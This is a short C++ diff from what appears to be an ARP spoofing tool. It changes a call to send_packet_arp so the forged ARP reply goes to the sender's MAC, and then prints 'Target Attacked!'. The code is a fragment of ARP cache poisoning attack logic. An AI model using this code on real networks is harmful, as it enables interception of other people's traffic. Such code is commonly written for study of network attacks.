@@ -107,8 +107,8 @@ int main(int argc, char* argv[]) {
 				if (static_cast<uint32_t>(arp_hdr->sip()) == static_cast<uint32_t>(Ip(argv[2 * i]))) break;
 			}
 		}
-		Mac victim_mac = arp_hdr->smac();
-		if(send_packet_arp(Mac(argv[2*i]),Mac(my_mac),Mac(victim_mac),Ip(argv[2*i+1]),Ip(argv[2*i]),false)==0){
+		Mac sender_mac = arp_hdr->smac();
+		if(send_packet_arp(Mac(sender_mac),Mac(my_mac),Mac(sender_mac),Ip(argv[2*i+1]),Ip(argv[2*i]),false)==0){
 			printf("Target %d Attacked!\n", i);
 		}
 	}
